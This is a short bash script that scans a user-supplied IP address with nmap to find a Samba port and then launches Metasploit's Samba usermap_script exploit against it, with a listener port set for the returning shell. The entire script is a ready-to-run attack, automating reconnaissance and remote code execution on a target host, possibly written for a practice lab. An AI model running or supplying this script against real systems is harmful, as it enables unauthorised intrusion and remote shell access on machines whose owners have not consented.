#!/bin/bash

# Ask for the Target IP Address
echo "Enter the target IP address:"
read TARGET_IP

# Read the number before "/" in the last Samba line in the nmap result and assigning to RPORT
RPORT=$(sudo nmap -sV -O $TARGET_IP | grep -i "samba" | tail -n 1 | cut -d '/' -f1)


# Start Metasploit console
msfconsole -q -x "
   use exploit/multi/samba/usermap_script;
   set RHOSTS $TARGET_IP;
   set RPORT $RPORT;
   set LPORT 4444;
   show options;
   run;
   
"
